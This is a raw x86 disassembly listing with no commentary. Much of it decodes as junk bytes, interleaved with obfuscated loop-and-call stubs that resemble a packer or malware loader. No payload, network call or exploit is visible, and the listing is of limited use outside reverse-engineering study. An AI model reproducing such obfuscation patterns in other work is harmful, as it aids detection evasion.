  40b006:	call   0xa4d9b9d8
  40b00b:	stos   BYTE PTR es:[edi],al
  40b00c:	es dec edx
  40b00e:	test   al,0xf1
  40b010:	cmp    eax,0x84098073
  40b015:	(bad)  
  40b016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b017:	scas   al,BYTE PTR es:[edi]
  40b018:	cmp    esp,esi
  40b01a:	jle    0x40b064
  40b01c:	push   cs
  40b01d:	jle    0x40afe6
  40b01f:	outs   dx,DWORD PTR es:[esi]
  40b021:	fst    QWORD PTR [eax+0x2182e08a]
  40b027:	sar    DWORD PTR [eax+0x2e],0xc6
  40b02b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02c:	jmp    0x40afdd
  40b02e:	or     eax,0xb8fc7a87
  40b033:	(bad)  
  40b034:	pop    eax
  40b035:	(bad)  
  40b036:	arpl   WORD PTR [ebp-0x65],bx
  40b039:	and    eax,0x134012dd
  40b03e:	push   0x3e
  40b040:	mov    esp,0x4c42c7bb
  40b045:	cwde   
  40b046:	sbb    esp,DWORD PTR [edi-0x7f9ffda]
  40b04c:	inc    esi
  40b04d:	popf   
  40b04e:	xor    esi,eax
  40b050:	(bad)  
  40b051:	xor    ebp,DWORD PTR [ecx+0x65]
  40b054:	lahf   
  40b055:	call   0x5a1d:0x315376ab
  40b05c:	jns    0x40b016
  40b05e:	dec    ecx
  40b05f:	xor    DWORD PTR [ecx+edx*8+0x2f],edi
  40b063:	adc    DWORD PTR [eax+0x7a],edx
  40b066:	nop
  40b067:	sbb    esi,ebp
  40b069:	test   eax,0xb1f0e9e9
  40b06e:	xchg   esp,eax
  40b06f:	mov    ch,BYTE PTR [esi+0x45]
  40b072:	lds    esp,FWORD PTR [edx]
  40b074:	push   ds
  40b075:	push   edx
  40b076:	dec    DWORD PTR [eax+ebp*8-0x13]
  40b07a:	jbe    0x40b0ab
  40b07c:	outs   dx,BYTE PTR ds:[esi]
  40b07d:	lds    ebp,FWORD PTR [eax]
  40b07f:	lahf   
  40b080:	imul   BYTE PTR [edi+0x34b04ae1]
  40b086:	xor    BYTE PTR [esi-0x66],0xd0
  40b08a:	sub    BYTE PTR [edi+eax*1-0x32],cl
  40b08e:	jmp    0x40b0fe
  40b090:	push   ds
  40b091:	and    eax,0x18eb6c33
  40b096:	or     esi,DWORD PTR ds:0x6c6aacff
  40b09c:	xor    eax,edx
  40b09e:	xor    esi,edx
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    cl,bl
  40b0da:	mov    DWORD PTR [ebx+0x7ee29d0f],esi
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b10f
  40b0e6:	jmp    0x3b2cefbc
  40b0eb:	adc    ch,BYTE PTR [edi-0x76]
  40b0ee:	out    dx,eax
  40b0ef:	push   edx
  40b0f0:	xchg   edi,eax
  40b0f1:	pushf  
  40b0f2:	sar    BYTE PTR [eax+eiz*1],0xf5
  40b0f6:	arpl   bx,bp
  40b0f8:	retf   0xc992
  40b0fb:	fs push ecx
  40b0fd:	jno    0x40b17b
  40b0ff:	pop    esi
  40b100:	out    dx,eax
  40b101:	in     eax,0x81
  40b103:	enter  0xb55d,0x5b
  40b107:	je     0x40b138
  40b109:	sbb    al,0xae
  40b10b:	push   ecx
  40b10c:	xor    DWORD PTR [eax],0xfcd484d4
  40b112:	cmp    al,0x8a
  40b114:	cmp    esp,DWORD PTR [eax]
  40b116:	and    edx,DWORD PTR [edi+0x3d]
  40b119:	retf   0xb8ed
  40b11c:	cmp    DWORD PTR [edx+0x2],eax
  40b11f:	mov    ?,WORD PTR [ecx-0x9e99f26]
  40b125:	stos   BYTE PTR es:[edi],al
  40b126:	adc    ch,al
  40b128:	adc    edi,DWORD PTR [edx]
  40b12a:	add    esi,ecx
  40b12c:	cmp    ebp,DWORD PTR [esi-0x1678ee2d]
  40b132:	icebp  
  40b133:	jecxz  0x40b194
  40b135:	adc    al,ah
  40b137:	push   esi
  40b138:	sbb    al,0x7a
  40b13a:	cmc    
  40b13b:	pop    ecx
  40b13c:	popa   
  40b13d:	sub    BYTE PTR [edi+ebx*2],al
  40b140:	rcl    BYTE PTR cs:[esi*1+0x707b91dc],1
  40b148:	xchg   edi,eax
  40b149:	push   edi
  40b14a:	mov    ebx,0x8f4d05bf
  40b14f:	iret   
  40b150:	and    al,0x83
  40b152:	fild   WORD PTR fs:[ebx]
  40b155:	stc    
  40b156:	ins    DWORD PTR es:[edi],dx
  40b157:	xchg   edx,eax
  40b158:	adc    BYTE PTR [esp+ecx*2],dl
  40b15b:	inc    esi
  40b15c:	xchg   ebx,eax
  40b15d:	mov    ecx,0xc11c2b81
  40b162:	adc    DWORD PTR [edx],0xfffffff4
  40b165:	(bad)  
  40b166:	pop    ebp
  40b167:	jge    0x40b1e5
  40b169:	mov    gs,WORD PTR [edx]
  40b16b:	push   esi
  40b16c:	icebp  
  40b16d:	jg     0x40b19f
  40b16f:	call   0x248799f5
  40b174:	dec    esp
  40b175:	dec    eax
  40b176:	fs xchg ecx,eax
  40b178:	pop    edx
  40b179:	jmp    0x876b:0x963d875c
  40b180:	xchg   ecx,ebx
  40b182:	xor    DWORD PTR [ebx+eax*8+0x7e40af27],0xdadfaca7
  40b18d:	xor    cl,bl
  40b18f:	fistp  QWORD PTR [eax-0x54]
  40b192:	leave  
  40b193:	pushf  
  40b194:	fsubr  DWORD PTR [edx-0x5b]
  40b197:	(bad)  
  40b198:	push   esp
  40b199:	sub    al,0xaf
  40b19b:	out    0xe3,eax
  40b19d:	imul   DWORD PTR [ebp-0x56]
  40b1a0:	(bad)  [ecx-0x3576c281]
  40b1a6:	icebp  
  40b1a7:	sbb    ah,BYTE PTR ds:0x8ee5ce32
  40b1ad:	loop   0x40b1b6
  40b1af:	es xor bl,al
  40b1b2:	test   BYTE PTR [ecx-0xd8f6c26],dh
  40b1b8:	pop    eax
  40b1b9:	fisttp WORD PTR [edx+0x33]
  40b1bc:	lods   eax,DWORD PTR ds:[esi]
  40b1bd:	and    esi,DWORD PTR [edi-0x3f14cbfe]
  40b1c3:	xchg   ebx,eax
  40b1c4:	ja     0x40b18d
  40b1c6:	mov    bl,dl
  40b1c8:	imul   edi,DWORD PTR [edx],0x7688ce13
  40b1ce:	add    BYTE PTR [edi],0xb
  40b1d1:	outs   dx,DWORD PTR ds:[esi]
  40b1d2:	lahf   
  40b1d3:	jmp    0x86a2c4a1
  40b1d8:	inc    ebx
  40b1d9:	je     0x40b1c9
  40b1db:	les    ebp,FWORD PTR [esp+ecx*8-0x5579c0e4]
  40b1e2:	stos   DWORD PTR es:[edi],eax
  40b1e3:	and    eax,0x6728f12
  40b1e8:	push   es
  40b1e9:	aam    0x4b
  40b1eb:	or     esi,DWORD PTR [eax+0x28]
  40b1ee:	retf   0x45c
  40b1f1:	pop    edi
  40b1f2:	cmp    esi,edx
  40b1f4:	(bad)  
  40b1f5:	push   ebp
  40b1f6:	mov    bl,0x1e
  40b1f8:	xchg   esp,eax
  40b1f9:	mov    esp,DWORD PTR [esi+0x3b4beea9]
  40b1ff:	lahf   
  40b200:	arpl   WORD PTR [ecx+0x2373422e],cx
  40b206:	sub    ebp,esi
  40b208:	cld    
  40b209:	push   0xffffffaa
  40b20b:	cmp    ebp,ecx
  40b20d:	or     ebx,DWORD PTR [esi]
  40b20f:	jbe    0x40b274
  40b211:	stos   BYTE PTR es:[edi],al
  40b212:	fs cld 
  40b214:	pop    eax
  40b215:	cld    
  40b216:	orps   xmm2,XMMWORD PTR ds:0xa806221c
  40b21d:	adc    DWORD PTR [edi+0x60],ebp
  40b220:	push   esp
  40b221:	lahf   
  40b222:	cmp    ecx,edx
  40b224:	pop    ds
  40b225:	mov    edx,0xa006150b
  40b22a:	mov    dh,0x3
  40b22c:	jl     0x40b281
  40b22e:	mov    dh,0xd5
  40b230:	xor    al,BYTE PTR [esi-0xe7c4bf]
  40b236:	cld    
  40b237:	push   ds
  40b238:	jp     0x40b2aa
  40b23a:	(bad)  
  40b23b:	mov    edi,0x1150e0e
  40b240:	xchg   ebx,eax
  40b241:	jno    0x40b240
  40b243:	aad    0xc3
  40b245:	pusha  
  40b246:	repnz mov BYTE PTR [eax+eiz*8+0x21],dl
  40b24b:	inc    esi
  40b24c:	test   dl,0xb8
  40b24f:	mov    ecx,edi
  40b251:	loop   0x40b290
  40b253:	and    ebp,DWORD PTR [ebp+0x27]
  40b256:	mov    al,ds:0xc9c7296d
  40b25b:	sub    ebx,DWORD PTR [esi+ecx*2]
  40b25e:	mov    bl,0x44
  40b260:	push   ss
  40b261:	sub    al,0x8a
  40b263:	push   esi
  40b264:	inc    ebp
  40b265:	scas   al,BYTE PTR es:[edi]
  40b266:	inc    eax
  40b267:	test   eax,0xc2babe0e
  40b26c:	aad    0xc8
  40b26e:	int    0x59
  40b270:	add    BYTE PTR ds:0xb1408a23,0x6d
  40b277:	sbb    dl,BYTE PTR [ebp-0x42]
  40b27a:	ss into 
  40b27c:	or     ch,BYTE PTR [esp+edi*1-0x798d42e5]
  40b283:	jle    0x40b2b3
  40b285:	scas   al,BYTE PTR es:[edi]
  40b286:	js     0x40b290
  40b288:	fimul  DWORD PTR [eax]
  40b28a:	out    0xee,al
  40b28c:	outs   dx,BYTE PTR ds:[esi]
  40b28d:	fldcw  WORD PTR [ebx]
  40b28f:	ret    
  40b290:	ror    BYTE PTR [esi+0x44],1
  40b293:	mov    dl,0x6c
  40b295:	mov    DWORD PTR [esi-0x3b0ed403],ebx
  40b29b:	xchg   ecx,eax
  40b29c:	ds add eax,0x7c56d670
  40b2a2:	ss mov dh,0xe5
  40b2a5:	inc    eax
  40b2a6:	or     DWORD PTR [edx+0x1e34ab22],ecx
  40b2ac:	sub    DWORD PTR [edx-0x75],edi
  40b2af:	lahf   
  40b2b0:	inc    ebx
  40b2b1:	mov    BYTE PTR [eax-0x6d],ch
  40b2b4:	arpl   cx,bx
  40b2b6:	fwait
  40b2b7:	mov    esp,DWORD PTR [eax]
  40b2b9:	jg     0x40b2d8
  40b2bb:	test   eax,0xc21dcce
  40b2c0:	call   0xc99f1621
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43056e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43057a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	mov    ds:0xfbf7c10e,al
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b35f
  40b2fd:	add    esp,DWORD PTR [esi-0x46c457f6]
  40b303:	stc    
  40b304:	mov    ebx,0x5b29876c
  40b309:	xchg   BYTE PTR [ebx+0x64ee1bb3],al
  40b30f:	in     al,dx
  40b310:	out    dx,al
  40b311:	mov    esi,0xf815b809
  40b316:	popf   
  40b317:	or     eax,0xafe6ad94
  40b31c:	xchg   ebp,eax
  40b31d:	out    dx,eax
  40b31e:	mov    ecx,0x5edca278
  40b323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b324:	mov    ch,0x7c
  40b326:	jmp    0x1c9:0xe917cca0
  40b32d:	mov    eax,0x34d1e7f4
  40b332:	scas   eax,DWORD PTR es:[edi]
  40b333:	pop    DWORD PTR [esp+eiz*2]
  40b336:	sti    
  40b337:	lds    edx,FWORD PTR [edx+0x31]
  40b33a:	dec    ebx
  40b33b:	cmp    al,0x88
  40b33d:	lds    ecx,FWORD PTR [edx+ebx*1-0x7af75008]
  40b344:	mov    ebp,0x10d875c2
  40b349:	psrld  xmm7,XMMWORD PTR [ebp+0xef40fc8]
  40b351:	adc    al,0xce
  40b353:	or     DWORD PTR [esi-0x401b77a0],edi
  40b359:	xlat   BYTE PTR ds:[ebx]
  40b35a:	mov    ds:0x6a7e11cb,eax
  40b35f:	aad    0x4c
  40b361:	pop    eax
  40b362:	fild   QWORD PTR [ecx-0x5c8398c4]
  40b368:	js     0x40b335
  40b36a:	inc    ebp
  40b36b:	(bad)  
  40b36c:	mov    bl,BYTE PTR [edi+eiz*2+0x7cb0da9e]
  40b373:	ficom  DWORD PTR [ebx+0x1]
  40b376:	mov    ah,0x67
  40b378:	jmp    0x40b373
  40b37a:	add    BYTE PTR [eax],dh
  40b37c:	pop    ebp
  40b37d:	ss push eax
  40b37f:	lds    edx,FWORD PTR [edi]
  40b381:	test   eax,0x666886d3
  40b386:	std    
  40b387:	retf   
  40b388:	pop    ds
  40b389:	popa   
  40b38a:	aas    
  40b38b:	push   esi
  40b38c:	das    
  40b38d:	push   esi
  40b38e:	inc    edi
  40b38f:	xchg   esp,eax
  40b390:	gs mov ebx,0xbe5f7dd3
  40b396:	push   esi
  40b397:	ss sbb al,0xa7
  40b39a:	cmp    BYTE PTR [esi+0xe],0xd
  40b39e:	test   al,0x41
  40b3a0:	sub    al,BYTE PTR [ecx+0x1]
  40b3a3:	sub    DWORD PTR [eax],eax
  40b3a5:	adc    eax,0x8379b0e3
  40b3aa:	inc    eax
  40b3ab:	ins    BYTE PTR es:[edi],dx
  40b3ac:	fbld   TBYTE PTR [edi]
  40b3ae:	fwait
  40b3af:	or     al,0xcb
  40b3b1:	popa   
  40b3b2:	jl     0x40b427
  40b3b4:	jae    0x40b372
  40b3b6:	xlat   BYTE PTR ds:[ebx]
  40b3b7:	call   0xa4cc4058
  40b3bc:	imul   edi,esi,0x78
  40b3bf:	mov    esp,ecx
  40b3c1:	ja     0x40b3fd
  40b3c3:	in     al,0x35
  40b3c5:	aaa    
  40b3c6:	mov    edx,0x23d248d3
  40b3cb:	mov    DWORD PTR [ecx+eiz*8-0x3],ebx
  40b3cf:	repnz push esi
  40b3d1:	test   DWORD PTR [edx],edx
  40b3d3:	out    0x49,eax
  40b3d5:	cmp    BYTE PTR [eax+eiz*1-0x4f],al
  40b3d9:	ins    DWORD PTR es:[edi],dx
  40b3da:	cs iret 
  40b3dc:	cmp    eax,DWORD PTR ds:0xa8ede43
  40b3e2:	cmp    DWORD PTR [edi+0x40637b8a],edx
  40b3e8:	sub    edi,DWORD PTR [ecx+0x3]
  40b3eb:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b3ed:	or     bh,dh
  40b3ef:	ss lahf 
  40b3f1:	inc    ecx
  40b3f2:	pop    es
  40b3f3:	(bad)  
  40b3f4:	jae    0x40b3dc
  40b3f6:	adc    BYTE PTR [esi],ah
  40b3f8:	and    ch,BYTE PTR [eax+edx*1+0x4b7edf08]
  40b3ff:	shr    BYTE PTR [esi],cl
  40b401:	dec    esi
  40b402:	pop    esi
  40b403:	call   0x3c55:0xc5ab130f
  40b40a:	ds jo  0x40b458
  40b40d:	ds je  0x40b476
  40b410:	repz xor DWORD PTR [edx-0x40],0xa20fdba4
  40b418:	jge    0x40b463
  40b41a:	in     al,dx
  40b41b:	int    0xda
  40b41d:	(bad)  
  40b41e:	mov    ch,BYTE PTR [esi]
  40b420:	js     0x40b3fe
  40b422:	jo     0x40b3e4
  40b424:	mov    ebx,0x5ff6d5cb
  40b429:	pop    ds
  40b42a:	sub    DWORD PTR [ebx+edi*2-0xe],esp
  40b42e:	fbld   TBYTE PTR ds:[eax-0x518c2a8b]
  40b435:	div    DWORD PTR [edi-0x681ba65]
  40b43b:	sbb    BYTE PTR [edi-0x39],ah
  40b43e:	inc    ebp
  40b43f:	cld    
  40b440:	xor    eax,0xc7f89c85
  40b445:	add    eax,0x43054e
  40b44a:	adc    DWORD PTR [eax],eax
  40b44c:	add    BYTE PTR [eax],al
  40b44e:	cmp    DWORD PTR ds:0x43054e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43054e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eae8
  40b479:	mov    eax,ds:0x43054e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43054e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4304ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430542
  40b4aa:	sbb    DWORD PTR ds:0x42e762,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee14
  40b4b8:	sub    DWORD PTR ds:0x43048e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430546,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430496,0x42e76a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e762,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430546,0x430492
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e75e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4304a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4304a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4304a6,edi
  40b536:	cmp    DWORD PTR ds:0x4304a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4304a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eaec
  40b560:	cmp    DWORD PTR ds:0x4304a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4304a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4304a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430492
  40b591:	xor    DWORD PTR ds:0x4304ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4304be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430486
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43053e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43053e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43053e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43053e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eaf0
  40b5f7:	cmp    DWORD PTR ds:0x43053e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43053e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43053e,edi
  40b613:	cmp    DWORD PTR ds:0x43053e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x31bb4dc4
  40b63f:	jecxz  0x40b6a0
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b654
  40b64a:	stos   BYTE PTR es:[edi],al
  40b64b:	mov    esi,0x9312fead
  40b650:	lock (bad) 
  40b652:	jnp    0x40b603
  40b654:	mov    fs:0xc4c29c73,eax
  40b65a:	(bad)  
  40b65b:	jns    0x40b69d
  40b65d:	mov    ebx,0x3a41b6ed
  40b662:	enter  0xd676,0x2e
  40b666:	(bad)  
  40b667:	int    0x6a
  40b669:	repnz and ebx,edi
  40b66c:	push   edi
  40b66d:	jmp    0x40b64c
  40b66f:	push   edx
  40b670:	js     0x40b65c
  40b672:	push   eax
  40b673:	jg     0x40b6dc
  40b675:	cmp    ecx,ecx
  40b677:	push   edx
  40b678:	mov    edx,0xc1e48b7b
  40b67d:	mov    ah,0xd7
  40b67f:	push   0xb0481cff
  40b684:	push   DWORD PTR [eax+0xa]
  40b687:	sti    
  40b688:	adc    eax,0x2c0d8356
  40b68d:	imul   ebp,DWORD PTR [ebx+edi*2],0x26
  40b691:	lds    ebp,FWORD PTR [edx+edx*8-0x3bd243ee]
  40b698:	jmp    0x40b6e2
  40b69a:	lods   al,BYTE PTR ds:[esi]
  40b69b:	mov    ah,0x29
  40b69d:	jg     0x40b6e0
  40b69f:	jmp    0xaf36460e
  40b6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a5:	nop
  40b6a6:	sar    BYTE PTR [ebp-0x5f7d69c6],cl
  40b6ac:	test   DWORD PTR [esp+esi*4],edi
  40b6af:	aad    0xb9
  40b6b1:	xlat   BYTE PTR ds:[ebx]
  40b6b2:	xchg   ebx,eax
  40b6b3:	xchg   ecx,eax
  40b6b4:	js     0x40b689
  40b6b6:	dec    eax
  40b6b7:	xchg   edi,eax
  40b6b8:	daa    
  40b6b9:	mov    ch,0xab
  40b6bb:	sbb    DWORD PTR [edi+edx*4],eax
  40b6be:	xor    edi,DWORD PTR [eax]
  40b6c0:	int3   
  40b6c1:	lods   eax,DWORD PTR ds:[esi]
  40b6c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6c3:	retf   0x6a69
  40b6c6:	xchg   ecx,eax
  40b6c7:	jno    0x40b70d
  40b6c9:	ds mov esi,0x6d86f849
  40b6cf:	loopne 0x40b65d
  40b6d1:	bound  ebx,QWORD PTR [edx-0x3f80be8f]
  40b6d7:	add    al,0xd1
  40b6d9:	stc    
  40b6da:	int3   
  40b6db:	ds push 0x53
  40b6de:	(bad)  
  40b6df:	dec    esi
  40b6e0:	gs mov esi,0xad9c2a1
  40b6e6:	mov    edx,0xff3a022c
  40b6eb:	out    0xb3,al
  40b6ed:	adc    eax,0xc22502c1
  40b6f2:	sub    BYTE PTR [edx],bl
  40b6f4:	add    edx,DWORD PTR [ebp-0x38e6bd79]
  40b6fa:	push   eax
  40b6fb:	jo     0x40b6b3
  40b6fd:	popa   
  40b6fe:	xchg   ebx,eax
  40b6ff:	icebp  
  40b700:	xchg   DWORD PTR [ebx+0x670398ac],esp
  40b706:	cli    
  40b707:	mov    WORD PTR [ebp-0x46007df7],fs
  40b70d:	mov    eax,0xf41daff4
  40b712:	mov    edx,0xfabad3e1
  40b717:	and    BYTE PTR [eax-0x5f9a9d4a],bh
  40b71d:	outs   dx,DWORD PTR ds:[esi]
  40b71e:	mov    ?,WORD PTR [ebx+0xf]
  40b721:	das    
  40b722:	xchg   edx,eax
  40b723:	jg     0x40b761
  40b725:	ficom  DWORD PTR [edi+ebx*1]
  40b728:	pop    esi
  40b729:	stc    
  40b72a:	mov    ecx,0x50a9bafb
  40b72f:	or     eax,0x1fd22308
  40b734:	inc    ebx
  40b735:	scas   eax,DWORD PTR es:[edi]
  40b736:	and    bl,BYTE PTR [ecx+esi*2-0x80]
  40b73a:	and    BYTE PTR [edi-0x7a],0xd2
  40b73e:	jno    0x40b6ff
  40b740:	loope  0x40b77d
  40b742:	in     al,0x3a
  40b744:	repnz mov ds:0xd11c2569,eax
  40b74a:	mov    al,ds:0xe3790174
  40b74f:	add    edi,0xffffffc2
  40b752:	add    BYTE PTR [esi],bl
  40b754:	stos   BYTE PTR es:[edi],al
  40b755:	mov    eax,0x8fc60075
  40b75a:	add    al,0x99
  40b75c:	ins    BYTE PTR es:[edi],dx
  40b75d:	pop    esi
  40b75e:	inc    ebp
  40b75f:	inc    edi
  40b760:	fdiv   DWORD PTR [esi-0x65]
  40b763:	or     BYTE PTR [ecx-0x10225ebd],dh
  40b769:	or     eax,ecx
  40b76b:	pop    ebp
  40b76c:	and    al,BYTE PTR [ebx+0x5e]
  40b76f:	nop
  40b770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b771:	adc    al,0x72
  40b773:	ins    BYTE PTR es:[edi],dx
  40b774:	push   edx
  40b775:	cmp    al,0xbf
  40b777:	int    0xca
  40b779:	mov    ds:0xc3e54291,eax
  40b77e:	retf   
  40b77f:	sbb    DWORD PTR [eax+0x78],ecx
  40b782:	inc    eax
  40b783:	sub    eax,0x66f98494
  40b788:	dec    ebx
  40b789:	out    0x89,eax
  40b78b:	jne    0x40b765
  40b78d:	and    DWORD PTR ds:0x4304b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430542
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xb47dde97
  40b7b0:	clc    
  40b7b1:	jge    0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b7f2
  40b7ba:	sub    BYTE PTR [edi-0x71],cl
  40b7bd:	adc    ah,BYTE PTR [ebx-0x24c4ebea]
  40b7c3:	outs   dx,DWORD PTR ds:[esi]
  40b7c4:	cmp    DWORD PTR [ebp+0x4b5460df],eax
  40b7ca:	push   edx
  40b7cb:	dec    edi
  40b7cc:	add    eax,0x84b1b327
  40b7d1:	sar    DWORD PTR [ebx],1
  40b7d3:	fnstsw WORD PTR [esi-0x40c3663d]
  40b7d9:	inc    ecx
  40b7da:	add    BYTE PTR [edx],ch
  40b7dc:	mov    cl,0x1d
  40b7de:	fdiv   QWORD PTR [ebx+0x3fe0d75]
  40b7e4:	xor    ebp,ebx
  40b7e6:	jno    0x40b7d0
  40b7e8:	or     al,0x97
  40b7ea:	cmp    dl,dh
  40b7ec:	stos   DWORD PTR es:[edi],eax
  40b7ed:	adc    eax,0x41e307f4
  40b7f2:	int    0xef
  40b7f4:	pushf  
  40b7f5:	adc    eax,DWORD PTR [edx+0x17]
  40b7f8:	and    eax,0x30cc0c5f
  40b7fd:	div    edx
  40b7ff:	and    bl,BYTE PTR [ebp-0x3c1091d3]
  40b805:	or     dh,al
  40b807:	or     cl,BYTE PTR [esp+eiz*8-0x66]
  40b80b:	add    eax,edx
  40b80d:	inc    esp
  40b80e:	shr    DWORD PTR [edx+0xd3e970c],1
  40b814:	ret    0xb0d5
  40b817:	bound  ebp,QWORD PTR [eax-0x15]
  40b81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b81b:	mov    ?,WORD PTR es:[edi-0x6a]
  40b81f:	add    eax,0xc97ea827
  40b824:	imul   edx,DWORD PTR [ecx+0x12d2d369],0xe3aee037
  40b82e:	retf   0xa10a
  40b831:	test   DWORD PTR [ecx+0x70],edx
  40b834:	les    ebp,FWORD PTR [edx]
  40b836:	mov    dl,0x56
  40b838:	xchg   esi,eax
  40b839:	xchg   esp,eax
  40b83a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b83b:	xor    DWORD PTR [ecx],esi
  40b83d:	mov    ds:0x2e092b8a,al
  40b842:	enter  0xe2d7,0x5d
  40b846:	ret    0xe657
  40b849:	shld   edx,ebp,cl
  40b84c:	dec    edx
  40b84d:	stc    
  40b84e:	push   ebx
  40b84f:	xchg   esp,eax
  40b850:	dec    ebp
  40b851:	test   dl,ch
  40b853:	aaa    
  40b854:	je     0x40b893
  40b856:	jns    0x40b888
  40b858:	xchg   esp,eax
  40b859:	mov    edi,0xc164eff8
  40b85e:	retf   0xb661
  40b861:	aad    0x85
  40b863:	std    
  40b864:	jne    0x40b8d9
  40b866:	js     0x40b8cd
  40b868:	ja     0x40b871
  40b86a:	out    dx,eax
